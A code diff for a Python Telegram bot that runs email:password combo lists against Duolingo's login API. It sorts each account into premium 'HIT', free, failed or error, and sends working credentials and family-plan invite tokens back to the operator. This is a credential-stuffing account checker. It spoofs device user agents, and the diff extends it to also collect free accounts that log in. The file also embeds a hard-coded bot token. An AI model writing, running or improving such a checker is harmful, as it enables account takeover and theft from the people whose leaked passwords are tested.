@@ -12,20 +12,12 @@ BOT_TOKEN = "8689449943:AAHFZdaE4L0TkH6S9BAAtmdWbwoTJYyzcJQ"
 ADMIN_ID = 8770379893
 # ===================================
 
-# Setup logging for terminal output
-logging.basicConfig(
-    format='%(asctime)s - %(message)s',
-    level=logging.INFO,
-    datefmt='%H:%M:%S'
-)
+logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO, datefmt='%H:%M:%S')
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Global variables for stop functionality
 checking_active = False
 stop_flag = False
-current_combo_list = []
-current_chat_id = None
 
 def get_headers(ua, jwt=None):
     headers = {
@@ -46,6 +38,21 @@ def generate_ua():
     versions = ["10", "11", "12", "13"]
     models = ["SM-G991B", "Pixel 6", "OnePlus 9", "Xiaomi Mi 11"]
     return f"Dalvik/2.1.0 (Linux; U; Android {versions[hash(str(time.time())) % len(versions)]}; {models[hash(str(time.time())) % len(models)]} Build/RP1A.200720.012)"
+
+def get_error_type(exception):
+    error_str = str(exception).lower()
+    if "timeout" in error_str:
+        return "⏱️ Timeout"
+    elif "connection" in error_str:
+        return "🔌 Connection Error"
+    elif "406" in error_str:
+        return "🚫 406 - Not Acceptable"
+    elif "429" in error_str:
+        return "🐌 429 - Rate Limit"
+    elif "500" in error_str or "502" in error_str or "503" in error_str:
+        return "⚠️ Server Error"
+    else:
+        return f"❌ {str(exception)[:30]}"
 
 def check_duolingo(email, password):
     session = requests.Session()
@@ -68,12 +75,12 @@ def check_duolingo(email, password):
         resp = session.post(login_url, json=login_payload, headers=login_headers, timeout=15)
         
         if resp.status_code != 200:
-            return None, None, None
+            return "FAIL", "wrong credentials", None, None
         
         login_data = resp.json()
         user_id = login_data.get("id")
         if not user_id:
-            return None, None, None
+            return "FAIL", "no user id", None, None
         
         # Get JWT from cookies
         jwt_token = None
@@ -83,17 +90,17 @@ def check_duolingo(email, password):
                 break
         
         if not jwt_token:
-            return None, None, None
+            return "FAIL", "no jwt token", None, None
         
         # Get profile
-        profile_url = f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}?fields=shopItems%2CtotalXp%2CstreakData%2Cusername%2CfromLanguage%2ClearningLanguage%2CgemsConfig%2ChasPlus%2CsubscriptionConfigs"
+        profile_url = f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}?fields=shopItems%2CtotalXp%2CstreakData%2Cusername%2CfromLanguage%2ClearningLanguage%2CgemsConfig%2ChasPlus%2CsubscriptionConfigs%2CcreatedAt"
         
         profile_headers = get_headers(ua, jwt_token)
         
         resp2 = session.get(profile_url, headers=profile_headers, timeout=15)
         
         if resp2.status_code != 200:
-            return None, None, None
+            return "FAIL", f"profile error {resp2.status_code}", None, None
         
         data = resp2.json()
         
@@ -132,11 +139,12 @@ def check_duolingo(email, password):
             has_premium = True
             plan_tier = "PREMIUM"
         
-        # If not premium, return None
+        # FREE account (login success but no premium)
         if not has_premium:
-            return None, None, None
+            free_result = f"⚠️ FREE | {email} | {username} | XP:{total_xp} | Streak:{streak}"
+            return "FREE", free_result, None, None
         
-        # Build result for HIT
+        # Build HIT result
         if plan_tier == "FAMILY" and invite_token:
             invite_link = f"https://www.duolingo.com/family-plan?invite={invite_token}"
             result = f"""
@@ -156,8 +164,6 @@ def check_duolingo(email, password):
 ├─ Product: `{product_id}`
 ├─ Renewing: `{renewing}`
 └─ Expires: `{expiry_date}`
-
-📱 Checked by: [ DUOLINGO ] BY ThuYa V3
 """
         else:
             result = f"""
@@ -175,14 +181,21 @@ def check_duolingo(email, password):
 ├─ Product: `{product_id}`
 ├─ Renewing: `{renewing}`
 └─ Expires: `{expiry_date}`
-
-📱 Checked by: [ DUOLINGO ] BY ThuYa V3
 """
         
-        return "HIT", result, invite_link
+        return "HIT", result, invite_token, None
         
+    except requests.exceptions.Timeout:
+        return "ERROR", "Timeout", None, "⏱️ Request timeout"
+    except requests.exceptions.ConnectionError:
+        return "ERROR", "Connection Error", None, "🔌 Cannot connect to API"
     except Exception as e:
-        return None, None, None
+        return "ERROR", str(e)[:50], None, get_error_type(e)
+
+def make_progress_bar(percent, width=20):
+    filled = int(width * percent / 100)
+    bar = "█" * filled + "░" * (width - filled)
+    return f"[{bar}] {percent:.1f}%"
 
 def process_combos(chat_id, combos, message_id):
     global checking_active, stop_flag
@@ -190,51 +203,112 @@ def process_combos(chat_id, combos, message_id):
     checking_active = True
     stop_flag = False
     
-    premium_hits = []
     total = len(combos)
+    hit_count = 0
+    free_count = 0
+    fail_count = 0
+    error_count = 0
+    error_types = {}
     
-    # Send initial message
-    bot.edit_message_text(f"📥 `{total}` combos loaded.\n🔍 Checking started...\n\n_Use /stop to cancel_", chat_id, message_id, parse_mode="Markdown")
+    start_time = time.time()
+    premium_hits = []
+    free_accounts = []
+    
+    # Initial progress message
+    progress_text = f"🚀 **Starting check...**\n\n`0/{total}` - Starting..."
+    bot.edit_message_text(progress_text, chat_id, message_id, parse_mode="Markdown")
     
     for i, (email, pwd) in enumerate(combos):
         if stop_flag:
-            bot.send_message(chat_id, "🛑 **Checking stopped by user.**", parse_mode="Markdown")
-            logging.info(f"🛑 Stopped by user at {i+1}/{total}")
+            bot.send_message(chat_id, "🛑 **Stopped by user.**", parse_mode="Markdown")
             break
         
-        # Log to terminal only
-        logging.info(f"[{i+1}/{total}] Checking: {email}")
+        current = i + 1
+        percent = (current / total) * 100
+        elapsed = time.time() - start_time
         
-        status, result, invite_link = check_duolingo(email, pwd)
+        # Show current checking email in progress bar
+        short_email = email[:25] + "..." if len(email) > 28 else email
+        
+        status, detail, invite_link, error_detail = check_duolingo(email, pwd)
         
         if status == "HIT":
-            premium_hits.append((email, pwd, result))
-            # Send to Telegram immediately when HIT found
-            bot.send_message(chat_id, result, parse_mode="Markdown")
+            hit_count += 1
+            premium_hits.append((email, pwd, detail))
+            # Send HIT immediately
+            bot.send_message(chat_id, detail, parse_mode="Markdown")
             logging.info(f"✅ HIT: {email}")
-        else:
-            logging.info(f"❌ FAIL: {email}")
+        elif status == "FREE":
+            free_count += 1
+            free_accounts.append((email, pwd, detail))
+            logging.info(f"⚠️ FREE: {email}")
+        elif status == "ERROR":
+            error_count += 1
+            err_type = error_detail if error_detail else detail
+            error_types[err_type] = error_types.get(err_type, 0) + 1
+            logging.info(f"❌ ERROR: {email} - {err_type}")
+        else:  # FAIL
+            fail_count += 1
+            logging.info(f"❌ FAIL: {email} - {detail}")
         
-        # Update progress every 50 combos
-        if (i+1) % 50 == 0 and not stop_flag:
-            bot.edit_message_text(f"📥 `{total}` combos loaded.\n🔍 Checking... `{i+1}/{total}` completed.\n⭐ HIT found: `{len(premium_hits)}`\n\n_Use /stop to cancel_", chat_id, message_id, parse_mode="Markdown")
+        # Update progress bar every 5 combos or last combo
+        if current % 5 == 0 or current == total or stop_flag:
+            progress_bar = make_progress_bar(percent)
+            
+            error_summary = ""
+            if error_types:
+                err_list = list(error_types.items())[:3]
+                error_summary = "\n".join([f"   ├─ {k}: {v}" for k, v in err_list])
+                if len(error_types) > 3:
+                    error_summary += f"\n   └─ +{len(error_types)-3} more"
+            
+            progress_text = f"""
+**🔍 Duolingo Checker** | BY ThuYa V3
+
+`{progress_bar}`
+`📧` **Now:** `{short_email}`
+
+**📊 Stats:**
+├─ `{current}/{total}` checked
+├─ ✅ **HIT (Premium):** `{hit_count}`
+├─ ⚠️ **FREE:** `{free_count}`
+├─ ❌ **FAIL:** `{fail_count}`
+└─ 🔴 **ERROR:** `{error_count}`
+
+⏱️ **Time:** `{elapsed:.1f}s`
+
+{error_summary if error_summary else "✅ No errors yet"}
+
+_Use /stop to cancel_
+"""
+            try:
+                bot.edit_message_text(progress_text, chat_id, message_id, parse_mode="Markdown")
+            except:
+                pass
         
         time.sleep(1.5)
     
-    # Summary
-    summary = f"""
-✅ **Check Completed!**
-
-📊 **Summary:**
-├─ Total: `{total}`
-├─ ⭐ Premium/Family HIT: `{len(premium_hits)}`
-└─ ❌ Failed/Free: `{total - len(premium_hits)}`
-
-💾 Premium accounts saved below 👇
-"""
-    bot.send_message(chat_id, summary, parse_mode="Markdown")
+    # Final summary
+    elapsed = time.time() - start_time
+    progress_bar = make_progress_bar(100)
     
-    # Send hits file
+    final_summary = f"""
+**✅ CHECK COMPLETED!** | BY ThuYa V3
+
+`{progress_bar}`
+`{total}/{total}` checked in `{elapsed:.1f}s`
+
+**📊 FINAL STATS:**
+├─ ✅ **HIT (Premium/Family):** `{hit_count}`
+├─ ⚠️ **FREE Accounts:** `{free_count}`
+├─ ❌ **FAIL (Wrong credentials):** `{fail_count}`
+└─ 🔴 **ERROR (Network/API):** `{error_count}`
+
+💾 **Premium hits saved below 👇**
+"""
+    bot.send_message(chat_id, final_summary, parse_mode="Markdown")
+    
+    # Send premium hits file
     if premium_hits:
         hit_content = f"# [ DUOLINGO ] BY ThuYa V3\n# Author: @thuyaaungzaw\n# Premium/Family Accounts\n# Total: {len(premium_hits)}\n\n"
         for email, pwd, result in premium_hits:
@@ -247,6 +321,18 @@ def process_combos(chat_id, combos, message_id):
             bot.send_document(chat_id, f)
     else:
         bot.send_message(chat_id, "No premium/family accounts found.")
+    
+    # Send free accounts file (optional)
+    if free_accounts:
+        free_content = f"# FREE Accounts (Login Success - No Premium)\n# Total: {len(free_accounts)}\n\n"
+        for email, pwd, detail in free_accounts:
+            free_content += f"{email}:{pwd}\n{detail}\n{'='*50}\n\n"
+        
+        with open("free_accounts.txt", "w", encoding="utf-8") as f:
+            f.write(free_content)
+        
+        with open("free_accounts.txt", "rb") as f:
+            bot.send_document(chat_id, f)
     
     checking_active = False
     stop_flag = False
@@ -266,11 +352,13 @@ def start_command(message):
         "👋 **Duolingo Premium Account Checker**\n\n"
         "**Config:** [ DUOLINGO ] BY ThuYa V3\n"
         "**Author:** @thuyaaungzaw\n\n"
-        "Click button below and send your **email:pass** combo file (.txt)\n\n"
-        "Format: `email@gmail.com:password123`\n\n"
-        "⚠️ **Only HIT (Premium/Family) accounts will appear here.**\n"
-        "❌ Failed/Free accounts are logged in terminal only.\n\n"
-        "🛑 Use `/stop` to cancel checking.",
+        "📂 Click button below → Send combo file (email:pass)\n\n"
+        "**Results:**\n"
+        "✅ HIT → Premium/Family (sent immediately)\n"
+        "⚠️ FREE → Login success, no premium\n"
+        "❌ FAIL → Wrong credentials\n"
+        "🔴 ERROR → Network/API issue\n\n"
+        "🛑 Use `/stop` to cancel",
         parse_mode="Markdown",
         reply_markup=markup
     )
@@ -285,10 +373,9 @@ def stop_command(message):
     
     if checking_active:
         stop_flag = True
-        bot.reply_to(message, "🛑 **Stopping check...** Please wait.")
-        logging.info("🛑 Stop command received")
+        bot.reply_to(message, "🛑 **Stopping...** Please wait.")
     else:
-        bot.reply_to(message, "ℹ️ No active check to stop.")
+        bot.reply_to(message, "ℹ️ No active check.")
 
 @bot.message_handler(func=lambda m: m.text == "📂 Check Duolingo Premium Accounts")
 def ask_file(message):
@@ -298,17 +385,17 @@ def ask_file(message):
 
 @bot.message_handler(content_types=['document'])
 def handle_file(message):
-    global current_combo_list, current_chat_id, checking_active
+    global checking_active
     
     if message.from_user.id != ADMIN_ID:
         bot.reply_to(message, "⛔ Unauthorized")
         return
     
     if checking_active:
-        bot.reply_to(message, "⚠️ A check is already running. Use /stop to cancel first.")
+        bot.reply_to(message, "⚠️ Check running. Use /stop first.")
         return
     
-    status_msg = bot.reply_to(message, "📥 Downloading file...")
+    status_msg = bot.reply_to(message, "📥 Downloading...")
     
     file_info = bot.get_file(message.document.file_id)
     downloaded_file = bot.download_file(file_info.file_path)
@@ -322,18 +409,14 @@ def handle_file(message):
             combos.append((email.strip(), pwd.strip()))
     
     if not combos:
-        bot.edit_message_text("❌ No valid combos found. Format: email:pass", status_msg.chat.id, status_msg.message_id)
+        bot.edit_message_text("❌ No valid combos. Format: email:pass", status_msg.chat.id, status_msg.message_id)
         return
     
-    current_combo_list = combos
-    current_chat_id = message.chat.id
-    
-    # Start checking in background thread
     thread = threading.Thread(target=process_combos, args=(message.chat.id, combos, status_msg.message_id))
     thread.start()
 
 print("🤖 Duolingo Premium Checker Bot is running...")
 print("Config: [ DUOLINGO ] BY ThuYa V3")
-print("Author: @thyaaungzaw")
-print("Features: Terminal only logging, HIT sent to Telegram, /stop to cancel")
+print("Author: @thuyaaungzaw")
+print("Features: Progress Bar | Live Email | HIT/FREE/FAIL/ERROR | /stop")
 bot.infinity_polling()
